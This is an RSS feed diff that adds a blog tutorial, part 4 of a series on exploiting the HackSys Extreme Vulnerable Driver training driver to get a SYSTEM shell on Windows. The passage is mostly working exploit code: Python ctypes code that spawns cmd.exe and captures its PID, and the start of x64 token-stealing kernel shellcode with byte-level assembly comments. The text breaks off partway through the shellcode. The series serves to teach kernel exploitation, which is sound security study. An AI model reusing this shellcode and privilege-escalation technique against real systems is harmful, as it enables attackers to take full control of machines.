@@ -6,9 +6,648 @@
 </description>
     <link>https://sizzop.github.io/</link>
     <atom:link href="https://sizzop.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 06 Jul 2016 16:52:51 -0400</pubDate>
-    <lastBuildDate>Wed, 06 Jul 2016 16:52:51 -0400</lastBuildDate>
+    <pubDate>Mon, 11 Jul 2016 09:08:33 -0400</pubDate>
+    <lastBuildDate>Mon, 11 Jul 2016 09:08:33 -0400</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
+    
+      <item>
+        <title>Kernel Hacking With HEVD Part 4 - The Exploit</title>
+        <description>&lt;p&gt;We’ve come a long way so far but we still don’t have a fully weaponized exploit. Let’s go back to the exploit outline we created for the DoS PoC and modify it to give us a SYSTEM shell:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+  &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+  &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+  &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+  &lt;li&gt;Create a buffer that redirects execution into shellcode&lt;/li&gt;
+  &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The device handle and IOCTL can be done at any point before the trigger, but this is how I did it for whatever reason. I’m going to skip over those parts since they will be the same as the DoS PoC created in the last post.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-one---spawn-cmdexe-process&quot;&gt;Step one - spawn cmd.exe process&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;&lt;strong&gt;Spawn cmd.exe process &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+    &lt;li&gt;Create a buffer that redirects execution into shellcode&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This is conceptually a very easy task, however doing it in Python requires a bunch of extra code compared to how it would go in C. I will use the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx&quot;&gt;CreateProcess&lt;/a&gt; API in Kernel32.dll to launch the shell. Looking at the function prototype, this function requires two structs to be set up for the call and one of them will come back to us with the PID of the cmd.exe process that we launched. We’ll need that for our shellcode later! Let’s set up our structs.&lt;/p&gt;
+
+&lt;p&gt;The first is a &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx&quot;&gt;STARTUPINFO&lt;/a&gt; struct which is annoyingly comprehensive for our purposes. With Python ctypes, structs are implemented like classes. I recreated the STARTUPINFO struct in my script like so:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;STARTUPINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;STARTUPINFO struct for CreateProcess API&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;_fields_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lpReserved&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPTSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lpDesktop&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPTSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lpTitle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPTSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwX&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwY&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwXSize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwYSize&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwXCountChars&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwYCountChars&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwFillAttribute&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwFlags&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;wShowWindow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cbReserved2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lpReserved2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hStdInput&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hStdOutput&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hStdError&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can reference this struct and it’s members later in the script like so:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STARTUPINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The next thing we’ll need is a &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx&quot;&gt;PROCESS_INFORMATION&lt;/a&gt; struct. This is a bit more manageable and looks like this in ctypes:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PROCESS_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;PROCESS_INFORMATION struct for CreateProcess API&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;_fields_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hProcess&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hThread&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwProcessId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dwThreadId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This will contain the PID of the created process in the dwProcessId dword. With those two structs created we can refer back to the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx&quot;&gt;CreateProcess&lt;/a&gt; function prototype and put together our API call. Here’s what I came up with:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;procreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Spawn shell and return PID&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Spawning shell...&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpApplicationName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;u&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;cmd.exe&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Unicode&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpCommandLine&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;u&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;cmd.exe&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Unicode&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpProcessAttributes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpThreadAttributes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bInheritHandles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CREATE_NEW_CONSOLE&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpEnvironment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpCurrentDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STARTUPINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpProcessInformation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROCESS_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpApplicationName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;           &lt;span class=&quot;c&quot;&gt;# _In_opt_      LPCTSTR&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;lpCommandLine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c&quot;&gt;# _Inout_opt_   LPTSTR&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;lpProcessAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# _In_opt_      LPSECURITY_ATTRIBUTES&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;lpThreadAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# _In_opt_      LPSECURITY_ATTRIBUTES&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bInheritHandles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;# _In_          BOOL&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;dwCreationFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;# _In_          DWORD&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;lpEnvironment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c&quot;&gt;# _In_opt_      LPVOID&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;lpCurrentDirectory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# _In_opt_      LPCTSTR&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpStartupInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# _In_          LPSTARTUPINFO&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpProcessInformation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# _Out_         LPPROCESS_INFORMATION&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-]Error spawning shell: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Make sure cmd.exe spawns fully before shellcode executes&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+]Spawned with PID: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpProcessInformation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwProcessId&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpProcessInformation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwProcessId&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;steps-two-and-three&quot;&gt;Steps two and three&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Get a handle to the vulnerable device &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Get the correct IOCTL for the stack overflow function &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+    &lt;li&gt;Create a buffer that redirects execution into shellcode&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Refer to the &lt;a href=&quot;/2016/07/06/kernel-hacking-with-hevd-part-2.html&quot;&gt;DoS PoC&lt;/a&gt; for the device handle and control code since nothing is changed here.&lt;/p&gt;
+
+&lt;h4 id=&quot;step-four---allocate-buffer-with-shellcode&quot;&gt;Step four - allocate buffer with shellcode&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Allocate buffer with shellcode &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Create a buffer that redirects execution into shellcode&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;/2016/07/07/kernel-hacking-with-hevd-part-3.html&quot;&gt;Part 3&lt;/a&gt; of this series went into detail on creating the shellcode we can use for this exploit so that will not be explained here. First let’s translate our shellcode we created into Python. This also involves dynamically inserting the PID of our cmd.exe process into the shellcode so I created a function which receives the PID we need and creates the shellcode:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Craft our shellcode and stick it in a buffer&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;tokenstealing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# Windows 7 x64 token stealing shellcode&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;# based on http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation&lt;/span&gt;
+
+                                                  &lt;span class=&quot;c&quot;&gt;#start:&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65\x48\x8B\x14\x25\x88\x01\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;#    mov rdx, [gs:188h]   ;KTHREAD pointer&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x4C\x8B\x42\x70&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                        &lt;span class=&quot;c&quot;&gt;#    mov r8, [rdx+70h]    ;EPROCESS pointer&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x4D\x8B\x88\x88\x01\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#    mov r9, [r8+188h]    ;ActiveProcessLinks list head&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x49\x8B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                            &lt;span class=&quot;c&quot;&gt;#    mov rcx, [r9]        ;follow link to first process in list&lt;/span&gt;
+                                                  &lt;span class=&quot;c&quot;&gt;#find_system:&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x8B\x51\xF8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                        &lt;span class=&quot;c&quot;&gt;#    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x83\xFA\x04&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                        &lt;span class=&quot;c&quot;&gt;#    cmp rdx, 4           ;UniqueProcessId == 4? &lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                &lt;span class=&quot;c&quot;&gt;#    jz found_system      ;YES - move on&lt;/span&gt;
